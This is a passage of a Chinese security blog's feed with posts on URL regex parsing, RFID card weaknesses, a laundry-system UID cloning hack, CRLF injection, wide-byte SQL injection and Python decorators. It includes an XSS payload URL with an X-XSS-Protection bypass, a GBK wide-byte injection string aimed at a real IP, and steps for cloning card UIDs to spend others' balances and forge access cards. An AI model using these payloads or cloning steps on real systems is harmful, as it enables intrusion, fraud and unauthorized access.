class="line">"""</div><div class="line">testcase = <span class="string">"protocol://username:password@www.sample.com:80/path.php?id=1#hash"</span></div><div class="line"></div><div class="line">r = re.compile(url_parse_re)</div><div class="line">str = re.match(r, testcase)</div><div class="line"><span class="keyword">if</span> str != <span class="keyword">None</span>:</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">9</span>):</div><div class="line">		<span class="keyword">print</span> x, str.group(x)</div></pre></td></tr></table></figure></p>
<a id="more"></a>
<p>下面是简略分析：</p>
<ul>
<li><code>?:</code>不捕获匹配文本，也不给它分配组和组号</li>
<li><code>^(\w*):\/\/</code>:匹配protocol://，例如<a href="http://,ftp://" target="_blank" rel="external">http://,ftp://</a></li>
<li><code>(?:       ([^:]*)?(?::(.*))?       @)?</code>匹配用户名密码部分</li>
<li><code>([0-9.\-A-Za-z]+)</code>:匹配hostname部分</li>
<li><code>(?::(\d+))?</code>: 匹配端口</li>
<li><code>(?:\/([^?#]*))?</code>匹配路径</li>
<li><code>(?:\?([^#]*))?</code>匹配请求参数</li>
<li><p><code>(?:#(.*))?$</code>匹配锚点</p>
<p>优点是对于不同的uri，各部分所在的group下标不变。例如group(4)是hostname，那么不管uri包不包含username和password，group(4)始终是hostname。  </p>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;uri的格式多种多样，经常需要校验uri或者分析uri提取各部分，下面提供一个自己写的正则表达式来提取uri，我用它来分析扫描器中输入的或者爬取到的uri，优先提取，由于水平有限，未能完全校验uri是否合法。&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#!/usr/bin/env python&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# -*- coding:utf-8 -*-&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; re&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;url_parse_re = &lt;span class=&quot;string&quot;&gt;r&quot;^(\w*):\/\/(?:([^:]*)?(?::(.*))?@)?([0-9.\-A-Za-z]+)(?::(\d+))?(?:\/([^?#]*))?(?:\?([^#]*))?(?:#(.*))?$&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;&quot;&quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;^(\w*):\/\/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;(?:       ([^:]*)?(?::(.*))?       @)?&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;([0-9.\-A-Za-z]+)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;(?::(\d+))?&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;(?:\/([^?#]*))?&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;(?:\?([^#]*))?&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;(?:#(.*))?$&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;testcase = &lt;span class=&quot;string&quot;&gt;&quot;protocol://username:password@www.sample.com:80/path.php?id=1#hash&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;r = re.compile(url_parse_re)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;str = re.match(r, testcase)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; str != &lt;span class=&quot;keyword&quot;&gt;None&lt;/span&gt;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; x &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; x, str.group(x)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="正则表达式" scheme="http://blog.nudtcat.org/categories/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
    
      <category term="正则表达式" scheme="http://blog.nudtcat.org/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>RFID杂谈</title>
    <link href="http://blog.nudtcat.org/RFID/RFID%E6%9D%82%E8%B0%88/"/>
    <id>http://blog.nudtcat.org/RFID/RFID杂谈/</id>
    <published>2016-10-07T11:32:16.000Z</published>
    <updated>2016-10-07T13:10:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这篇文章各个部分没有逻辑联系，每个部分一个主题。</p>
<p>对RFID的了解并不深刻，如果有疏漏或者错误，可以发邮件给我或者直接评论。</p>
<h2 id="0x01-读卡的过程"><a href="#0x01-读卡的过程" class="headerlink" title="0x01 读卡的过程"></a>0x01 读卡的过程</h2><p>了解一个系统最好先了解这个系统的各个模块与各个层次，知道每个模块，每个层次的作用，当遇到关于这个系统的知识时，知道它说的是这个系统的哪一部分。<br><a id="more"></a><br><img src="/images/161007_01.png" alt=""></p>
<h2 id="0x02-一个M1卡的例子🌰"><a href="#0x02-一个M1卡的例子🌰" class="headerlink" title="0x02 一个M1卡的例子🌰"></a>0x02 一个M1卡的例子🌰</h2><p>很多学校一卡通都是用的哈尔滨新中新电子的M1卡。众所周知，M1卡存在漏洞能够破解读取密码。而且在新中新的卡中，一卡通的消费密码直接写在卡片中。如果一个学校所有一卡通的密码都是一样的，只要破解出自己卡片的密码即可读取别人的消费密码。</p>
<p>但是，实践表明，每张卡的密码都是不同的。而刷卡的机器可能无法实时联网，而且存储空间可能不够。那么，卡片的密码可能是UID通过一定的摘要算法生成的。</p>
<p>众所周知，加密的安全性不能依靠算法的保密性，而应该仅依赖密钥的安全性。但是，依赖算法保密性的设计在卡片安全这个特定领域中非常常见，而且很多时候也是相对安全的。</p>
<h2 id="0x03-银行卡的隐私保护"><a href="#0x03-银行卡的隐私保护" class="headerlink" title="0x03 银行卡的隐私保护"></a>0x03 银行卡的隐私保护</h2><p>在PBOC(中国人民银行)的银行卡规范中，具有NFC功能的银行卡内，卡内保存的卡号，姓名，身份证号，最近10笔消费记录是自由可读的。国外的EMV标准中亦是如此。严格来说，不能算安全问题。</p>
<p>360甚至还出了卡套和卡防来解决这个问题。强迫症的同学可以使用。</p>
<p>当然，可以使用程序来读取，有人写了一个脚本来读取和解析。<a href="https://github.com/nudtcat/pbocreader" target="_blank" rel="external">github地址</a>。可以配合ACR122u食用。</p>
<h2 id="0x04-磁条卡的复制"><a href="#0x04-磁条卡的复制" class="headerlink" title="0x04 磁条卡的复制"></a>0x04 磁条卡的复制</h2><p>在芯片卡还没有普及的时候，银行卡基本都是磁条卡，磁条卡的盗刷非常严重。原因就是磁条卡三条磁轨内的数据自由可读，而且磁条卡中数据的作用跟ID卡中ID的作用类似。</p>
<p>芯片卡普及以后，这种内置CPU的卡片安全很多了，基本不可能复制，而且芯片卡虽然还有磁条，但是强制使用芯片交易，不能降维攻击。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;这篇文章各个部分没有逻辑联系，每个部分一个主题。&lt;/p&gt;
&lt;p&gt;对RFID的了解并不深刻，如果有疏漏或者错误，可以发邮件给我或者直接评论。&lt;/p&gt;
&lt;h2 id=&quot;0x01-读卡的过程&quot;&gt;&lt;a href=&quot;#0x01-读卡的过程&quot; class=&quot;headerlink&quot; title=&quot;0x01 读卡的过程&quot;&gt;&lt;/a&gt;0x01 读卡的过程&lt;/h2&gt;&lt;p&gt;了解一个系统最好先了解这个系统的各个模块与各个层次，知道每个模块，每个层次的作用，当遇到关于这个系统的知识时，知道它说的是这个系统的哪一部分。&lt;br&gt;
    
    </summary>
    
      <category term="RFID" scheme="http://blog.nudtcat.org/categories/RFID/"/>
    
    
      <category term="RFID" scheme="http://blog.nudtcat.org/tags/RFID/"/>
    
  </entry>
  
  <entry>
    <title>关于信任的反思</title>
    <link href="http://blog.nudtcat.org/Chat/%E5%85%B3%E4%BA%8E%E4%BF%A1%E4%BB%BB%E7%9A%84%E5%8F%8D%E6%80%9D/"/>
    <id>http://blog.nudtcat.org/Chat/关于信任的反思/</id>
    <published>2016-09-25T11:54:22.000Z</published>
    <updated>2016-09-28T03:12:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-信任"><a href="#0x01-信任" class="headerlink" title="0x01 信任"></a>0x01 信任</h2><p>很多安全事件的问题都出现在信任上，上层模块对底层模块的信任，人对软件的信任，人对人的信任，都是安全问题频发的地方。<br><a id="more"></a></p>
<h2 id="0x02-被证实的信任危机"><a href="#0x02-被证实的信任危机" class="headerlink" title="0x02 被证实的信任危机"></a>0x02 被证实的信任危机</h2><ul>
<li>XcodeGhost事件：开发人员对编译器的信任</li>
<li>BadUSB：操作系统对外设的信任</li>
<li>条形码扫描器漏洞</li>
</ul>
<h2 id="0x03-被滥用的信任"><a href="#0x03-被滥用的信任" class="headerlink" title="0x03 被滥用的信任"></a>0x03 被滥用的信任</h2><ul>
<li>杀毒软件对下载站的信任：各种下载站的捆绑软件，静默安装行为无疑具有恶意软件的行为特征，但是杀毒软件基本不查杀，一旦下载站被种马，后果非常严重</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-信任&quot;&gt;&lt;a href=&quot;#0x01-信任&quot; class=&quot;headerlink&quot; title=&quot;0x01 信任&quot;&gt;&lt;/a&gt;0x01 信任&lt;/h2&gt;&lt;p&gt;很多安全事件的问题都出现在信任上，上层模块对底层模块的信任，人对软件的信任，人对人的信任，都是安全问题频发的地方。&lt;br&gt;
    
    </summary>
    
      <category term="杂谈" scheme="http://blog.nudtcat.org/categories/Chat/"/>
    
    
      <category term="安全" scheme="http://blog.nudtcat.org/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="update" scheme="http://blog.nudtcat.org/tags/update/"/>
    
      <category term="信任" scheme="http://blog.nudtcat.org/tags/%E4%BF%A1%E4%BB%BB/"/>
    
  </entry>
  
  <entry>
    <title>从一个简单的RFID安全事件说起</title>
    <link href="http://blog.nudtcat.org/RFID/%E4%BB%8E%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84RFID%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E8%AF%B4%E8%B5%B7/"/>
    <id>http://blog.nudtcat.org/RFID/从一个简单的RFID安全事件说起/</id>
    <published>2016-09-25T04:41:49.000Z</published>
    <updated>2016-09-28T01:43:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-know-it"><a href="#0x01-know-it" class="headerlink" title="0x01 know it"></a>0x01 know it</h2><p>学校新增了一个微信洗衣系统，用起来相当简单，首先，在系统的微信公众号上注册一个账户，账户是使用openid作为cookie，openid是微信生成的，只有在关注了公众号的时候才会产生。openid由几个因素决定，一个是公众号的appid，另一个是关注者的微信id。openid的作用就是让微信公众号的开发者唯一标识一个关注者。然后，将账户与任一一张卡绑定起来(我们学校有水卡和一卡通两张卡)。洗衣系统的充值使用微信支付，余额跟着微信走。<br><a id="more"></a><br>也就是说，整个结构就是线上存着你的各种信息以及余额，怎么去使用余额洗衣呢？就依靠你手上的卡，这张卡与系统进行了绑定，拿到卡，就拿到了系统的通行证。洗衣的时候拿着卡在洗衣机终端上刷一下，即可验证身份，使用余额。</p>
<h2 id="0x02-key-point"><a href="#0x02-key-point" class="headerlink" title="0x02 key point"></a>0x02 key point</h2><p>那么卡与系统是怎么绑定的呢？在系统中，每个账户都可以绑定一个物理卡ID，如图所示：<img src="/images/0925_01.png" alt=""><br>当然，普通人肯定不知道一张卡的物理卡ID是多少，于是，洗衣机终端就承担了这个功能。当一张未绑定的卡去刷洗衣机终端时，终端显示如下</p>
<p><img src="/images/0925_02.png" alt=""></p>
<p>然后只需要在系统中绑定这个物理卡号即可。绑定后正常使用的照片如下图<img src="/images/0925_03.png" alt=""></p>
<h2 id="0x03-analysis-it"><a href="#0x03-analysis-it" class="headerlink" title="0x03 analysis it"></a>0x03 analysis it</h2><p>我们重点分析一下这个鉴权过程，系统使用物理卡ID来唯一标识用户，而我们使用的卡都是M1卡，M1卡中存储着UID和block，block的访问是需要密码的，而洗衣系统和一卡通是不同的公司开发的，所以肯定不是使用block中存储的数据来唯一标识用户，而每张M1卡的UID都是唯一的，但是可以通过可写入的白卡写入相同的UID。关于RFID和M1卡的相关知识以及安全漏洞请自行Google。所以这个物理卡ID应该就是M1卡的UID。遂试验之，果然，连最简单的映射都没有做</p>
<p><img src="/images/0925_04.png" alt=""><br><img src="/images/0925_05.png" alt=""></p>
<p>我们看上面洗衣终端正常工作的照片，发现终端居然直接将卡ID赤裸裸展示出来，这不是直接把密码输出了嘛！</p>
<h2 id="0x04-hack-it"><a href="#0x04-hack-it" class="headerlink" title="0x04 hack it"></a>0x04 hack it</h2><p>分析到这里，用别人的余额洗衣就非常容易了。只需要在洗衣终端上读到一卡通卡号，把它作为UID写入白卡即可。</p>
<h2 id="0x05-躺枪的其它系统"><a href="#0x05-躺枪的其它系统" class="headerlink" title="0x05 躺枪的其它系统"></a>0x05 躺枪的其它系统</h2><p>到这里就结束了吗？</p>
<p>我曾经丢失过自己的一卡通，补办后发现刚开始的一段时间无法打开门禁。这说明什么问题呢？补办的一卡通和原来的一卡通唯一的区别就在UID上。也就是说，补办后，在中央数据库中，我的UID有更新，而门禁需要一段时间同步更新，那么，门禁也是靠UID来识别身份的。</p>
<p>只有门禁吗？</p>
<p>一个学校的系统各种各样，门禁，闸机，多媒体讲台，一个同学或者老师的权限都由统一认证系统来确定，那么，我们从程序员和系统设计者的角度来想，这个统一认证系统肯定留了API，来供其他系统调用，鉴权。这样的设计容易扩展，更容易与其他系统配合，它的市场竞争力就会强。果然，经过试验，图书馆的闸机也是用UID来验证，而且还会显示出卡对应的名字和院系。</p>
<p>黑客永远抵抗不了root权限的诱惑，如果我们能拿到这个API，那么。。。。嘿嘿嘿。。。。</p>
<p>于是就有了下面这张照片，成功伪造了一张校长的卡</p>
<p><img src="/images/0925_06.jpg" alt=""></p>
<h2 id="0x06-p-s"><a href="#0x06-p-s" class="headerlink" title="0x06 p.s."></a>0x06 p.s.</h2><p>光拿到UID不能伪造出可以消费的一卡通，一卡通的消费是实时服务器校验的，而且在block中，对余额以及身份信息做了摘要，如果不知道摘要算法，无法伪造一张合法的卡</p>
<p>M1卡早就被曝出加密算法具有重大缺陷，具体可以Google，读卡器使用的是ACR122U。RFID安全也是安全的一个维度，国内有RadioWar团队研究比较深入。</p>
<h2 id="0x07-想到的"><a href="#0x07-想到的" class="headerlink" title="0x07 想到的"></a>0x07 想到的</h2><p>安全永远不止那么简单，一个小小的设计缺陷–显示了卡的UID，导致了所有基于UID的鉴权全部崩溃。有的时候，一个小口子，就能瞬间将精心构建的安全防护体系毁于一旦。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-know-it&quot;&gt;&lt;a href=&quot;#0x01-know-it&quot; class=&quot;headerlink&quot; title=&quot;0x01 know it&quot;&gt;&lt;/a&gt;0x01 know it&lt;/h2&gt;&lt;p&gt;学校新增了一个微信洗衣系统，用起来相当简单，首先，在系统的微信公众号上注册一个账户，账户是使用openid作为cookie，openid是微信生成的，只有在关注了公众号的时候才会产生。openid由几个因素决定，一个是公众号的appid，另一个是关注者的微信id。openid的作用就是让微信公众号的开发者唯一标识一个关注者。然后，将账户与任一一张卡绑定起来(我们学校有水卡和一卡通两张卡)。洗衣系统的充值使用微信支付，余额跟着微信走。&lt;br&gt;
    
    </summary>
    
      <category term="RFID" scheme="http://blog.nudtcat.org/categories/RFID/"/>
    
    
      <category term="RFID" scheme="http://blog.nudtcat.org/tags/RFID/"/>
    
      <category term="安全" scheme="http://blog.nudtcat.org/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CRLF注入</title>
    <link href="http://blog.nudtcat.org/WebSecurity/CRLF%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.nudtcat.org/WebSecurity/CRLF注入/</id>
    <published>2016-09-25T02:33:16.000Z</published>
    <updated>2016-09-28T03:13:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>在HTTP协议中，HTTP请求与响应的各个字段之间的分隔符为\r\n，即CRLF。如果我们能在HTTP<strong>响应</strong>部分注入CRLF，并且加入自己的一部分代码，浏览器就会接受并且解析HTTP响应，完成我们想要的功能。<br><a id="more"></a></p>
<h2 id="0x02-危害"><a href="#0x02-危害" class="headerlink" title="0x02 危害"></a>0x02 危害</h2><p>能注入HTTP响应部分，我们能干啥呢？HTTP响应分为head部分和body部分，head部分各个字段之间的分隔是\r\n，head与body的分隔是\r\n。我们可以注入到body中，加入javascript代码，形成xss攻击。只要能注入代码到body部分，所有在浏览器层面的攻击都能实行。</p>
<p>另一个常见的攻击是注入头部，给当前的会话设置cookie，如果存在会话固定漏洞，那么就能获得用户对应的权限。</p>
<h2 id="0x03-会话固定漏洞"><a href="#0x03-会话固定漏洞" class="headerlink" title="0x03 会话固定漏洞"></a>0x03 会话固定漏洞</h2><p>在CRLF注入head部分，设置cookie后，如果服务器接受了这个cookie，并且在用户登录后不改变这个cookie，那么攻击者就能使用这个cookie，拿到和合法用户一样的权限。</p>
<h2 id="0x04-攻击方法"><a href="#0x04-攻击方法" class="headerlink" title="0x04 攻击方法"></a>0x04 攻击方法</h2><p>常见的攻击点在重定向的地方，如果没做过滤或者其它安全设置，直接在跳转的url后加上\r\n和要插入的代码，例如<a href="http://www.a.com/go.php?target=http://www.b.com\r\n\r\n" target="_blank" rel="external">http://www.a.com/go.php?target=http://www.b.com\r\n\r\n</a><script>alert(xss)</script>将这个url发送给要攻击的用户，ta点击了这个链接就会被攻击。在插入xss时，可能会被浏览器的xss filter阻止，只要在head部分插入X-XSS-Protection:0即可禁止浏览器的xss保护策略。另外，在location后面的javascript代码只会在内核为webkit的浏览器中运行。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h2&gt;&lt;p&gt;在HTTP协议中，HTTP请求与响应的各个字段之间的分隔符为\r\n，即CRLF。如果我们能在HTTP&lt;strong&gt;响应&lt;/strong&gt;部分注入CRLF，并且加入自己的一部分代码，浏览器就会接受并且解析HTTP响应，完成我们想要的功能。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.nudtcat.org/categories/WebSecurity/"/>
    
    
      <category term="Web安全" scheme="http://blog.nudtcat.org/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>宽字节注入问题</title>
    <link href="http://blog.nudtcat.org/WebSecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98/"/>
    <id>http://blog.nudtcat.org/WebSecurity/宽字节注入问题/</id>
    <published>2016-09-25T01:23:19.000Z</published>
    <updated>2016-09-28T03:12:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-宽字节"><a href="#0x00-宽字节" class="headerlink" title="0x00 宽字节"></a>0x00 宽字节</h2><p>在代码注入攻击中，宽字节问题已经是老生常谈。注意，这里的代码注入是指宽泛的代码注入：<strong>所有突破数据与代码边界，使数据注入代码段，变成可执行代码</strong>的攻击手法都可以叫代码注入，包括SQL注入和XSS。啥是宽字节呢？其实就是用多个字节表示一个字符。<br><a id="more"></a></p>
<h2 id="0x01-另一个角度看MySQL的宽字节注入问题"><a href="#0x01-另一个角度看MySQL的宽字节注入问题" class="headerlink" title="0x01 另一个角度看MySQL的宽字节注入问题"></a>0x01 另一个角度看MySQL的宽字节注入问题</h2><p>先说说MySQL中的宽字节注入，MySQL在接受到php传来的SQL语句时，会使用MySQL设置中的character_set_client设置值进行编码。而如果character_set_client是一个宽字符集，那么可能会将SQL语句中的多个字节编码成一个字符，这样就改变了SQL语句的原意。我们对这个编码前的SQL语句稍加控制，使编码编掉一些字符，比如\，这样就能绕过php层的安全策略。说起来可能略抽象，下面打一个简单的比方。</p>
<p>实验环境：magic_quotes_gpc=Off，php代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=$_GET[<span class="string">'a'</span>];</div><div class="line">$a=addslashes($a);</div><div class="line"><span class="keyword">print</span> <span class="string">"select * from admin where name='"</span>.$a.<span class="string">"'"</span>;</div></pre></td></tr></table></figure></p>
<p>代码非常简单，将传入的a使用addslashes函数转义，转义掉单引号等字符。我们请求<a href="http://115.28.188.93/1.php?a=admin%df" target="_blank" rel="external">http://115.28.188.93/1.php?a=admin%df</a>‘ and 1=1 – s抓包，看到的响应如下图<br><img src="/images/0924_01.png" alt=""><br>红色框中被选中的内容就是响应的内容，这个是二进制的，可以看做是SQL语句在传给MySQL的时候的状态。这个时候，浏览器的返回时这样的(浏览器编码设置为UTF-8)<br><img src="/images/0924_02.png" alt=""></p>
<p>在这里，浏览器设置的编码相当于MySQL的character_set_client，浏览器会对http响应的部分做编码，MySQL也是一样，这种情况下，我们发现我们请求中的单引号已经被转义了，无法形成SQL注入。我们把浏览器编码设置为gbk，再看看<br><img src="/images/0924_03.png" alt=""></p>
<p>这个时候，我们发现\不见了，我们插入的单引号成功闭合了前面的单引号，and 1=1已经插入到了SQL语句代码部分，能影响SQL语句的逻辑。也就是说，这个时候，我们相当于把MySQL的character_set_client设置成了gbk，成功引发了宽字节的注入问题，这就是整个数据流的流向，最复杂的一部分已经弄清楚了，下面就是一些细节问题了。</p>
<p>在admin%df’被addslashes后，结果是admin%df\’,也就是admin%df%5c%27,而将其转换为gbk编码后，%df%5c代表一个中文字符，然后就被编码成運，喜闻乐见的，我们的单引号就被插入了。</p>
<p>(题外话：不同浏览器在得到一个没有指定编码的html响应时可能会采用不同的编码，我的Chrome和Firefox就是这样。所以，请手动设置编码方式)</p>
<p>哪些范围会被gbk编码成汉字呢？根据gbk编码，第一个字节ascii码大于128，基本上就可以了。如果character_set_client是gb2312，能不能成功呢？理论上来说，只要\，也就是%5c在某些字符集的低位中，都是可以的，不巧，gb2312的低位范围是0xA1~0xFE，所以不可以。</p>
<h2 id="0x03-初衷"><a href="#0x03-初衷" class="headerlink" title="0x03 初衷"></a>0x03 初衷</h2><p>我为啥写这篇文章？phithon在Freebuf上的<a href="http://www.freebuf.com/articles/web/31537.html" target="_blank" rel="external">浅析白盒审计中的字符编码及SQL注入</a>写得非常好，但是我认为在SQL语句的流向方面写得不够详细，我做了一点补充，其余内容请参看phithon大神的文章。如果有什么不明白，那多半是SQL语句的流向以及编码状态不明白，可以参考我上面浏览器编码的比喻。</p>
<h2 id="0x04-意识"><a href="#0x04-意识" class="headerlink" title="0x04 意识"></a>0x04 意识</h2><p>玩儿英雄联盟的人都知道，意识最为重要。做安全也是如此，意识本质上是安全观。宽字节的问题，有可能改头换面出现在另一个地方，就看下次遇到的时候，谁能思考得深，看到更内在的东西了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-宽字节&quot;&gt;&lt;a href=&quot;#0x00-宽字节&quot; class=&quot;headerlink&quot; title=&quot;0x00 宽字节&quot;&gt;&lt;/a&gt;0x00 宽字节&lt;/h2&gt;&lt;p&gt;在代码注入攻击中，宽字节问题已经是老生常谈。注意，这里的代码注入是指宽泛的代码注入：&lt;strong&gt;所有突破数据与代码边界，使数据注入代码段，变成可执行代码&lt;/strong&gt;的攻击手法都可以叫代码注入，包括SQL注入和XSS。啥是宽字节呢？其实就是用多个字节表示一个字符。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.nudtcat.org/categories/WebSecurity/"/>
    
    
      <category term="Web安全" scheme="http://blog.nudtcat.org/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="SQL注入" scheme="http://blog.nudtcat.org/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="宽字节" scheme="http://blog.nudtcat.org/tags/%E5%AE%BD%E5%AD%97%E8%8A%82/"/>
    
  </entry>
  
  <entry>
    <title>Python装饰器</title>
    <link href="http://blog.nudtcat.org/Python/Python%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
    <id>http://blog.nudtcat.org/Python/Python装饰器/</id>
    <published>2016-09-24T03:36:54.000Z</published>
    <updated>2016-09-28T03:13:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-语法糖"><a href="#0x00-语法糖" class="headerlink" title="0x00 语法糖"></a>0x00 语法糖</h2><p>装饰器是Python一个语法糖，装饰器就是在不改变原函数的基础上，在原函数前后执行一些代码，就好像在原函数上增加了一些装饰品一样。这个语法能非常方便给一个函数增加一些功能，例如权限控制，校验一个函数的输入等。<br><a id="more"></a></p>
<h2 id="0x01-语法原理"><a href="#0x01-语法原理" class="headerlink" title="0x01 语法原理"></a>0x01 语法原理</h2><h3 id="最简单的情况"><a href="#最简单的情况" class="headerlink" title="最简单的情况"></a>最简单的情况</h3><p>装饰一个有参数的函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(func)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kwargs)</span>:</span></div><div class="line">		res=func(*args,**kwargs)</div><div class="line">		<span class="keyword">print</span> <span class="string">"function "</span>+func.__name__+<span class="string">" return "</span>+str(res)</div><div class="line">		<span class="keyword">return</span> res</div><div class="line">	<span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="meta">@debug</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span><span class="params">(a, b)</span>:</span></div><div class="line">	<span class="keyword">return</span> a + b</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	<span class="keyword">print</span> sum(<span class="number">1</span>,<span class="number">3</span>)</div></pre></td></tr></table></figure></p>
<p>运行结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">function sum return 4</div><div class="line">4</div></pre></td></tr></table></figure></p>
